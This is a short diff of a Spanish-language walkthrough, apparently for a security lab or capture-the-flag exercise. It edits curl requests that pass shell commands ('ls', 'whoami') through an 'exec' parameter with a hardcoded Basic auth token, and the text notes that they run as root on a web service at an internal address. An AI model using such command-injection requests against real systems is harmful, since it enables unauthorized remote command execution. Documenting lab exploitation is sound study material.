@@ -156,9 +156,9 @@ usamos curl con el parametro exec
 
 Ejecutamos el comando y podemos observar que listamos archivos y también podemos observar que los ejecutamos como root
 
-curl http://localhost:8081/?exec=ls -H 'Authorization: Basic we_are_bones_513546516486484'
+curl http://172.18.0.2:8081/?exec=ls -H 'Authorization: Basic we_are_bones_513546516486484'
 
-curl http://localhost:8081/?exec=whoami -H 'Authorization: Basic we_are_bones_513546516486484'
+curl http://172.18.0.2:8081/?exec=whoami -H 'Authorization: Basic we_are_bones_513546516486484'
 
 Encodeamos la URL con https://www.urlencoder.org/
 
